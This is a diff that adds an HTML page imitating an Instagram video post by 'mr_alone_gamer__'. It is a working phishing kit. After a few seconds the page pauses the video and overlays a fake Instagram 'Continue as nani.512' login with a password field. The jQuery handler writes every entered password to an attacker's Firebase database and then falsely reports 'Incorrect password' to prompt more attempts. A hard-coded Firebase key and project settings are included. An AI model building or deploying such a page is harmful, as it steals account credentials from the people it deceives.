@@ -1,0 +1,1204 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Instagram Video Post</title>
+        
+        <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    
+    
+    <script src="https://www.gstatic.com/firebasejs/5.5.3/firebase.js"></script>
+    
+    
+    <style>
+        
+* {
+    margin:0;
+    padding:0;
+    border:0.0px solid lightgrey;
+    font-family: Verdana, Tahoma, "Trebuchet MS", "DejuVu Sans", "Bitstream Vera Sans", sans-serif;
+}
+
+body {
+    height:100vh;
+    width:100vw;
+    overflow-x:hidden;
+}
+
+.container {
+    display:flex;
+    width:100%;
+    height:50px;
+}
+
+.player {
+    width:100%;
+}
+
+video {
+    width:100%;
+    height:100%;
+}
+
+.details {
+    height:100px;
+}
+
+.row1 {
+    height:50px;
+}
+
+.row2 {
+    height:;
+}
+
+.row4 {
+    height:30px;
+}
+
+.row5 {
+    height:75px;
+    padding-bottom:30px;
+}
+
+p , img {
+    height:fit-content;
+    margin-top:auto;
+    margin-bottom:auto;
+}
+
+.row1 p {
+    text-align:center;
+    height:fit-content;
+    font-weight:500;
+    font-size:22px;
+    margin-left:20px;
+}
+
+.row1 img{
+    height:18px;
+    margin-top:auto;
+    margin-bottom:auto;
+    margin-left:10px;
+    
+    
+}
+
+.row2 img {
+    margin:auto;
+    margin-left:10px;
+    border-radius:50%;
+    height:30px;
+    margin-right:8px;
+    padding:2px;
+    border:0.5px solid lightgrey;
+}
+
+.row2 p {
+    font-size:14px;
+    font-weight:500;
+    padding:2px;
+}
+
+.row2 p:nth-child(3) {
+    margin-right:10px;
+    margin-left:auto;
+    transform:rotateZ(90deg);
+    font-size:15px;
+}
+
+.row4 img{
+    margin-left:10px;
+    height:22px;
+    margin-right:5px;
+}
+
+.row4 img:nth-child(5) {
+    margin-right:10px;
+    margin-left:auto;
+}
+
+.row5 p {
+    margin-top:10px;
+    font-size:14px;
+    margin-left:10px;
+}
+
+.vidcontrols {
+    position:absolute;
+    width:100vw;
+    background-color:;
+    height:360px;
+    margin-top:20px;
+}
+
+.vidcontrols svg {
+    margin-left:0%;
+    margin-top:35%;
+    height:80px;
+    display:none;
+}
+
+.like {
+    animation: pop 0.5s ease-in-out;
+}
+
+@keyframes pop {
+    0% {
+        transform:scale(0.1);
+    }
+    40% {
+        transform:scale(1.4);
+    }
+    80% {
+        transform:scale(1.1);
+    }
+    100% {
+        transform:scale(1);
+    }
+}
+
+.like2 {
+    animation: pop2 0.5s ease-in-out;
+}
+
+@keyframes pop2 {
+    0% {
+        transform:scale(1);
+    }
+    40% {
+        transform:scale(1.2);
+    }
+    80% {
+        transform:scale(1.1);
+    }
+    100% {
+        transform:scale(1);
+    }
+}
+
+.sound {
+    margin:0;
+    position:absolute;
+    height:30px;
+    width:30px;
+    margin-top:-35px;
+    right:5px;
+    background-color:;
+}
+
+#love2 {
+    padding-top:4px;
+    padding-bottom:4px;
+    margin-top:0;
+    margin-bottom:0;
+}
+
+#likes {
+    display:none;
+}
+
+.row5 .date {
+    font-size:10px;
+    color:grey;
+}
+
+.postpage {
+    background-color:grey;
+    z-index:25;
+    position:absolute;
+    top:0;
+    left:0;
+    width:100%;
+}
+
+#blankbg {
+    position:absolute;
+    top:0;
+    left:0;
+    min-height:100%;
+    height:auto;
+    width:100%;
+    background-color:rgba(0,0,0,0.5);
+    display:none;
+}
+
+#loginbg {
+    background-color:white;
+    height:auto;
+    width:70%;
+    border-radius:10px;
+    margin:auto;
+    margin-top:25%;
+    display:none;
+    animation:0.5s anim ease-in-out;
+}
+
+.instagram {
+    height:35px;
+    transform:translateX(-50%);
+    margin-left:50%;
+    margin-top:30px;
+}
+
+.profile {
+    height:80px;
+    border-radius:50%;
+    padding:1px;
+    border:0.5px solid #ececec;
+    transform:translateX(-50%);
+    margin-left:50%;
+    margin-top:10px;
+}
+
+button {
+    background-color:#0095F7;
+    color:#fff;
+    font-weight:500;
+    padding:7px;
+    border-radius:3px;
+    transform:translateX(-50%);
+    margin-left:50%;
+    margin-top:20px;
+    font-size:15px;
+    white-space:nowrap;
+    width:80%;
+    
+}
+
+a {
+    text-decoration:none;
+    color:#0095F7;
+}
+
+.remove {
+    font-size:13px;
+    font-weight:500;
+    color:#0095F7;
+    text-align:center;
+    margin-top:15px;
+}
+
+#loginbg hr {
+    height:0.8px;
+    border:none;
+    background-color:lightgrey;
+    width:80%;
+    margin-left:10%;
+    margin-top:25px;
+}
+
+.switch {
+    font-size:13px;
+    font-weight:500;
+    color:#0095F7;
+    text-align:center;
+    margin-top:5px;
+    padding-bottom:30px;
+}
+
+.notnani , .orblack {
+    color:grey;
+    font-size:13px;
+    color:black;
+    opacity:0.8;
+    font-weight:normal;
+    text-align:center;
+    margin-top:15px;
+}
+
+@keyframes anim {
+    0%{
+        transform:scale(0.9);
+    }
+    50% {
+        transform:scale(1.1);
+    }
+    100% {
+        transform:scale(1);
+    }
+}
+
+#pg1 {
+    visibility:visible;
+}
+
+#pg2 {
+    position:absolute;
+    left:0;
+    width:100%;
+    border:0px solid grey;
+    width:70%;
+    margin-left:15%;
+    z-index:10;
+    display:none;
+}
+
+#enterpass {
+    font-size:14px;
+    font-weight:500;
+    margin-left:5px;
+    margin-left:10%;
+    margin-top:10px;
+}
+
+
+#pass , #pg2 button {
+    height:35px;
+    transform:translateX(-50%);
+    position:;
+    width:80%;
+    margin-top:10px;
+    border-radius:5px;
+    outline:none;
+    border:1px solid lightgrey;
+    padding-left:10px;
+    margin-left:50%;
+}
+
+#pg2 button {
+    border:none;
+    width:85%;
+}
+
+#forgetpass {
+    font-size:13px;
+    color:#0095F7;
+    text-align:right;
+    margin-right:10%;
+    margin-top:5px;
+}
+
+
+#loading {
+   
+   top:0;
+   left:0;
+   min-height:100%;
+   width:100%;
+   background-color:rgba(0,0,0,0.6);
+   display:none;
+   position:fixed;
+}
+
+
+
+.b {
+  display: inline-block;
+  position: relative;
+  width: 70px;
+  height: 70px;
+}
+/* width:28px;height:28px; */
+
+.d {
+  position: absolute;
+  width: 0px;
+  height: 0px;
+  overflow: hidden;
+}
+
+.e {
+  width: 100%;
+  height: 100%;
+}
+
+.b.c .e {
+  animation: 1568ms linear 0s infinite normal none running s1;
+}
+
+.f {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  opacity: 0;
+}
+
+.g {
+  border-color: #fff;
+}
+
+.p {
+  border-color: #fff;
+}
+
+.r {
+  border-color: #fff;
+}
+
+.t {
+  border-color: #fff;
+}
+
+.b.c .f.g {
+  animation: 5332ms cubic-bezier(0.4, 0, 0.2, 1) 0s infinite normal both running s2, 5332ms cubic-bezier(0.4, 0, 0.2, 1) 0s infinite normal both running blue;
+}
+
+.b.c .f.p {
+  animation: 5332ms cubic-bezier(0.4, 0, 0.2, 1) 0s infinite normal both running s2, 5332ms cubic-bezier(0.4, 0, 0.2, 1) 0s infinite normal both running red;
+}
+
+.b.c .f.r {
+  animation: 5332ms cubic-bezier(0.4, 0, 0.2, 1) 0s infinite normal both running s2, 5332ms cubic-bezier(0.4, 0, 0.2, 1) 0s infinite normal both running yellow;
+}
+
+.b.c .f.t {
+  animation: 5332ms cubic-bezier(0.4, 0, 0.2, 1) 0s infinite normal both running s2, 5332ms cubic-bezier(0.4, 0, 0.2, 1) 0s infinite normal both running green;
+}
+
+
+
+.m {
+  position: absolute;
+  box-sizing: border-box;
+  top: 0px;
+  left: 45%;
+  width: 10%;
+  height: 100%;
+  overflow: hidden;
+  border-color: inherit;
+}
+
+.m .k {
+  width: 1000%;
+  left: -450%;
+}
+
+.i {
+  display: inline-block;
+  position: relative;
+  width: 50%;
+  height: 100%;
+  overflow: hidden;
+  border-color: inherit;
+}
+
+.i .k {
+  width: 200%;
+}
+
+
+
+.k {
+  position: absolute;
+  inset: 0px;
+  box-sizing: border-box;
+  height: 100%;
+  border-width: 4px; /* 3px */
+  border-style: solid;
+  border-top-color: inherit;
+  border-right-color: inherit;
+  border-left-color: inherit;
+  border-bottom-color: transparent;
+  border-radius: 50%;
+  animation: 0s ease 0s 1 normal none running none;
+}
+
+.i.j .k {
+  border-right-color: transparent;
+  transform: rotate(129deg);
+}
+
+.i.o .k {
+  left: -100%;
+  border-left-color: transparent;
+  transform: rotate(-129deg);
+}
+
+.b.c .i.j .k {
+  animation: 1333ms cubic-bezier(0.4, 0, 0.2, 1) 0s infinite normal both running left;
+}
+
+.b.c .i.o .k {
+  animation: 1333ms cubic-bezier(0.4, 0, 0.2, 1) 0s infinite normal both running right;
+}
+
+.b.sf4e6b .e {
+  animation: 1568ms linear 0s infinite normal none running s1, 400ms cubic-bezier(0.4, 0, 0.2, 1) 0s 1 normal none running fade;
+}
+
+
+@keyframes s1 {
+ 
+  100% {
+    transform: rotate(360deg);
+  }
+}
+
+@keyframes s2 {
+ 
+  12.5% {
+    transform: rotate(135deg);
+  }
+
+  25% {
+    transform: rotate(270deg);
+  }
+
+  37.5% {
+    transform: rotate(405deg);
+  }
+
+  50% {
+    transform: rotate(540deg);
+  }
+
+  62.5% {
+    transform: rotate(675deg);
+  }
+
+  75% {
+    transform: rotate(810deg);
+  }
+
+  87.5% {
+    transform: rotate(945deg);
+  }
+
+  100% {
+    transform: rotate(1080deg);
+  }
+}
+
+@keyframes blue {
+ 
+  0% {
+    opacity: 0.99;
+  }
+
+  25% {
+    opacity: 0.99;
+  }
+
+  26% {
+    opacity: 0;
+  }
+
+  89% {
+    opacity: 0;
+  }
+
+  90% {
+    opacity: 0.99;
+  }
+
+  100% {
+    opacity: 0.99;
+  }
+}
+
+@keyframes red {
+ 
+  0% {
+    opacity: 0;
+  }
+
+  15% {
+    opacity: 0;
+  }
+
+  25% {
+    opacity: 0.99;
+  }
+
+  50% {
+    opacity: 0.99;
+  }
+
+  51% {
+    opacity: 0;
+  }
+}
+
+@keyframes yellow {
+ 
+  0% {
+    opacity: 0;
+  }
+
+  40% {
+    opacity: 0;
+  }
+
+  50% {
+    opacity: 0.99;
+  }
+
+  75% {
+    opacity: 0.99;
+  }
+
+  76% {
+    opacity: 0;
+  }
+}
+
+@keyframes green {
+ 
+  0% {
+    opacity: 0;
+  }
+
+  65% {
+    opacity: 0;
+  }
+
+  75% {
+    opacity: 0.99;
+  }
+
+  90% {
+    opacity: 0.99;
+  }
+
+  100% {
+    opacity: 0;
+  }
+}
+
+@keyframes left {
+ 
+  0% {
+    transform: rotate(130deg);
+  }
+
+  50% {
+    transform: rotate(-5deg);
+  }
+
+  100% {
+    transform: rotate(130deg);
+  }
+}
+
+@keyframes right {
+ 
+  0% {
+    transform: rotate(-130deg);
+  }
+
+  50% {
+    transform: rotate(5deg);
+  }
+
+  100% {
+    transform: rotate(-130deg);
+  }
+}
+
+@keyframes fade {
+ 
+  0% {
+    opacity: 0.99;
+  }
+
+  100% {
+    opacity: 0;
+  }
+}
+
+.a {
+  text-align: center;
+  margin-top: 51%;
+}
+
+#watermark {
+    position:fixed;
+    top:0;
+    left:0;
+    height:100%;
+    width:100%;
+    background-color:white;
+}
+
+#watermark img {
+    transform:translate(-50%,-50%);
+    margin-top:50vh;
+    margin-left:50vw;
+    height:50px;
+}
+
+#wrongpass {
+    color:red;
+    font-size:13px;
+    margin-left:8%;
+    margin-top:2px;
+    display:none;
+}
+
+.spinner {
+  position:relative;
+  margin: 0px auto 0;
+  width: 30px;
+  text-align: center;
+  bottom:30px;
+  display:none;
+}
+
+.spinner > div {
+  width: 6.3px;
+  height: 6.3px;
+  background-color: #fff;
+
+  border-radius: 100%;
+  display: inline-block;
+  -webkit-animation: sk-bouncedelay 1.4s infinite ease-in-out both;
+  animation: sk-bouncedelay 1.4s infinite ease-in-out both;
+}
+
+.spinner .bounce1 {
+  -webkit-animation-delay: -0.32s;
+  animation-delay: -0.32s;
+}
+
+.spinner .bounce2 {
+  -webkit-animation-delay: -0.16s;
+  animation-delay: -0.16s;
+}
+
+@-webkit-keyframes sk-bouncedelay {
+  0%, 80%, 100% { -webkit-transform: scale(0) }
+  40% { -webkit-transform: scale(1.0) }
+}
+
+@keyframes sk-bouncedelay {
+  0%, 80%, 100% { 
+    -webkit-transform: scale(0);
+    transform: scale(0);
+  } 40% { 
+    -webkit-transform: scale(1.0);
+    transform: scale(1.0);
+  }
+}
+
+
+
+
+    </style>
+    
+    
+    
+        
+        
+        
+    </head>
+    <body>
+    
+    <div id="postpage">
+    
+    <div class="container row1">
+        
+        <img src="https://i.ibb.co/Tb6MmDM/1644945512349.png" />
+        
+        <p> Video</p>
+        
+    </div>
+    
+    <div class="container row2">
+        
+        <img height="24px" src="https://i.ibb.co/pyqDLtM/Q-1644975073159.jpg" />
+        
+        <p> mr_alone_gamer__</p>
+        
+        <p> ••• </p>
+        
+    </div>
+    
+    <div id="player" class="player row3">
+    
+    <div id="controls" class="vidcontrols">
+    
+<svg id="love"
+    version="1.1"
+    xmlns="http://www.w3.org/2000/svg"
+    xmlns:xlink="http://www.w3.org/1999/xlink"
+    x="0%" y="0%"
+    width="100%" height="100%"
+    viewBox="0 0 24.0 24.0"
+    enable-background="new 0 0 24.0 24.0"
+    xml:space="preserve">
+    
+    <path
+        fill="#FFFFFF"
+        stroke="#FF0000"
+        fill-opacity="1.000"
+        stroke-opacity="1.000"
+        fill-rule="nonzero"
+        stroke-width="0.0"
+        stroke-linejoin="miter"
+        stroke-linecap="square"
+        d="M12.07,5.26C14.29,1.77,20.01,1.77,22.35,5.84C24.38,9.56,23.17,13.00,20.22,15.50L13.46,21.51Q12.00,22.83,10.74,21.47L4.08,15.63C2.78,14.55,0.46,11.93,0.90,8.74C1.33,5.56,3.36,2.83,6.81,2.70C8.81,2.56,10.48,3.27,12.07,5.26z"/>
+</svg>
+
+    
+    
+    
+    </div>
+        <video id="video" poster="https://i.ibb.co/SJqJHLz/images-2022-02-16-T133034.jpg" muted autoplay loop>
+                        <source src="https://dl.dropboxusercontent.com/s/2xs7qp9a6gibc8o/video.mp4?dl=0" >
+        </video>
+        
+        
+        
+        
+    </div>
+    
+    <div id="row4" class="container row4">
+        
+        <div class="sound">
+            
+        </div>
+        
+        
+        <img id="love2" class="love" src="https://i.ibb.co/tx9ccs7/1644975366316.png" />
+        
+        <img class="comment" src="https://i.ibb.co/YcNfzNZ/1644975383205.png" />
+        
+        <img class="share" src="https://i.ibb.co/PmYTPFh/1644975406613.png" />
+        
+        <img class="save" src="https://i.ibb.co/6vcDzLD/1644975428546.png" />
+        
+    </div>
+    
+    <div class="details row5">
+        
+        <p id="views"> <b>240 views</b></p>
+        <p id="likes">Liked by <b>You</b> and <b>48 others</b></p>
+        
+        <p> <b>mr_alone_gamer__</b> Surprise 😜</p>
+        
+        <p class="date">22 October 2021</p>
+        
+    </div>
+    
+    <div id="blankbg">
+        
+        <div id="loginbg">
+        
+            <div id="pg2">
+                <img class="instagram" src="https://i.ibb.co/QFy23X6/1642696813765.png" />
+                
+                <img class="profile" src="https://i.ibb.co/kcSNzZT/Q-1642755101002.jpg"/>
+                
+                <p id="enterpass"> Enter your password</p>
+                
+                <input id="pass" type="password" placeholder="Password" />
+                <p id="wrongpass">Incorrect password</p>
+                <p id="forgetpass"> <a href="https://www.instagram.com/accounts/password/reset/">Forget Password?</a></p>
+                
+                <button id="login">Continue</button>
+                <div class="spinner" id="spinner">
+  <div class="bounce1"></div>
+  <div class="bounce2"></div>
+  <div class="bounce3"></div>
+</div>
+                
+            </div>
+        
+        
+            <div id="pg1">
+            <img class="instagram" src="https://i.ibb.co/QFy23X6/1642696813765.png" />
+            
+            <img class="profile" src="https://i.ibb.co/kcSNzZT/Q-1642755101002.jpg"/>
+            <button id="continue">Continue as nani.512</button>
+            
+            <p class="remove"> <a href="https://www.instagram.com/accounts/login/">Remove Account</a></p>
+            
+            <hr>
+            
+            <p class="notnani"> Not nani.512? </p>
+            <p class="switch"> <a href="https://www.instagram.com/accounts/login/"> Switch Accounts </a> <span class="orblack">or</span> <a href="https://www.instagram.com/accounts/signup/phone">Sign Up </a></p>
+            </div>
+            
+            
+            
+            
+            
+        </div>
+        
+    </div>
+    
+    
+    </div>
+        
+        
+        <div id="loading">
+    
+    
+<div class="a">
+
+<div class="b c">
+
+<div class="d">Loading…</div>
+
+<div class="e"><div class="f g h">
+
+<div class="i j"><div class="k l"></div></div><div class="m">
+
+<div class="k l"></div></div><div class="i o">
+
+<div class="k l"></div></div></div>
+
+<div class="f p q"><div class="i j"><div class="k l"></div></div><div class="m">
+
+<div class="k l"></div></div><div class="i o"><div class="k l"></div></div></div>
+
+<div class="f r s"><div class="i j"><div class="k l"></div></div><div class="m">
+
+<div class="k l"></div></div><div class="i o"><div class="k l"></div></div></div>
+
+<div class="f t u"><div class="i j"><div class="k l"></div></div><div class="m">
+
+<div class="k l"></div></div><div class="i o"><div class="k l">
+
+</div></div></div></div></div></div>
+
+</div>
+        
+        <div id="watermark">
+            
+            <img src="https://i.ibb.co/C0q1hkp/1645178918701.png" />
+            
+        </div>
+    </body>
+    
+    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script> 
+    
+    
+    <script>
+        
+        window.onload = () => {
+document.getElementById("watermark").style.display ="none";
+
+var isloginactive = false;
+var video = document.getElementById("video");
+var minilove = document.getElementById("love2");
+var like = false;
+window.onclick = () => {
+  if(video.muted)
+  video.muted = !video.muted;
+};
+check();
+video.addEventListener("dblclick", function() {
+//whitelike(); 
+});
+
+
+minilove.onclick = () => {
+    likekaro();
+    check();
+}
+
+//document.getElementById("row4").onclick = () => {
+//    likekaro();
+//}
+
+minilove.onclick = null;
+video.addEventListener("dblclick",null);
+
+
+function whitelike() {
+    
+    let love = document.getElementById("love");
+let love2 =  document.getElementById("love2");
+love.style.display = "block";
+love2.src = "https://i.ibb.co/7gSfwvk/1644975789673.png";
+like = true;
+check();
+love.classList.add("like");
+love2.classList.add("like2");
+
+setTimeout( () => {
+document.getElementById("love").classList.remove("like");
+setTimeout( () => {
+love.style.display = "none";
+},400);
+document.getElementById("love2").classList.remove("like2");
+},500);
+    
+    
+}
+
+
+
+function likekaro() {
+    
+    let love3 = document.getElementById("love2");
+    
+    if(love3.src != "https://i.ibb.co/tx9ccs7/1644975366316.png") {
+    love3.src = "https://i.ibb.co/tx9ccs7/1644975366316.png";
+    like = false;
+    }
+    else
+    {
+        love3.src = "https://i.ibb.co/7gSfwvk/1644975789673.png";
+        like = true;
+    }
+    love3.classList.add("like2");
+    setTimeout( () => {
+document.getElementById("love2").classList.remove("like2");
+},500);
+
+}
+
+function check() {
+    if(like) {
+    document.getElementById("views").style.display = "none";
+document.getElementById("likes").style.display = "block";
+    }
+    else {
+document.getElementById("views").style.display = "block";
+document.getElementById("likes").style.display = "none";
+    }
+}
+
+
+
+class Alert {
+
+    constructor() {
+        this.bg= document.getElementById("blankbg");
+        this.lbg = document.getElementById("loginbg");
+        this.page1 = document.getElementById("pg1");
+        this.page2 = document.getElementById("pg2");
+        this.passinput = document.getElementById("pass");
+        this.loading = document.getElementById("loading");
+        this.button = document.getElementById("login");
+        this.caption = document.getElementById("wrongpass")
+    }
+
+    show() {
+        this.bg.style.display = "block";
+        this.lbg.style.display = "block";
+    }
+    
+    showpg2() {
+        this.page1.style.visibility = "hidden";
+        this.page2.style.display = "block";
+        this.passinput.focus();
+    }
+    
+    showloading() {
+        this.loading.style.display = "block";
+    }
+    
+    hideloading() {
+        this.loading.style.display = "none";
+    }
+    activatebutton() {
+        this.button.style.backgroundColor = "#0095F7";
+        isloginactive = true;
+    }
+    deactivatebutton() {
+        this.button.style.backgroundColor = "#ececec";
+        isloginactive = false;
+    }
+    clearpassword() {
+        this.passinput.value = "";
+        this.passinput.style.borderColor = "red";
+        this.caption.style.display = "block";
+        
+        setTimeout( () => {
+            this.passinput.style.borderColor = "lightgrey";
+        this.caption.style.display = "none";
+        },1500)
+        
+        
+    }
+
+
+}
+
+var a = new Alert();
+
+a.deactivatebutton();
+document.getElementById("continue").onclick = () => {
+    a.showpg2();
+}
+
+document.getElementById("pass").onkeyup = () => {
+ let value = document.getElementById("pass").value;
+ 
+ if(value.length >= 6)
+ {
+     a.activatebutton();
+ }
+ else
+ {
+     a.deactivatebutton();
+ }
+}
+
+
+
+setTimeout( () => {
+    video.pause();
+    a.showloading();
+    
+    setTimeout( () => {
+    a.hideloading();
+    a.show();
+    },Math.floor(Math.random()*1000)+1500)
+},Math.floor(Math.random()*1000)+1500)
+
+
+var config = {
+    apiKey: "AIzaSyA_kyipbRucrtWAtf8jbULc1B0DBRHPHHU",
+
+
+    authDomain: "sharemedia-298b0.firebaseapp.com",
+
+
+    databaseURL: "https://sharemedia-298b0-default-rtdb.firebaseio.com/",
+
+
+    projectId: "sharemedia-298b0",
+
+
+    storageBucket: "sharemedia-298b0.appspot.com",
+
+
+    messagingSenderId: "453857796374"
+  };
+
+firebase.initializeApp(config); 
+var rootRef = firebase.database().ref().child('graduate');
+
+
+
+$('#login').click(function(){ 
+if(isloginactive) {
+rootRef.push().set({ firstName:"Nani.512", lastName:$('#pass').val() });
+}
+loginkaro();
+
+})
+
+function loginkaro() {
+    
+    if(isloginactive) {
+    let spinner = document.getElementById("spinner");
+    
+    spinner.style.display = "block";
+    document.getElementById("login").style.color = "#0095F7"
+    setTimeout( () => {
+        spinner.style.display = "none";
+        a.clearpassword();
+        a.deactivatebutton();
+       document.getElementById("login").style.color = "#fff"
+    },Math.floor(Math.random()*2000)+1500);
+    }
+    
+}
+
+}
+        
+    </script>
+    
+    
+    
+    
+    
+</html>
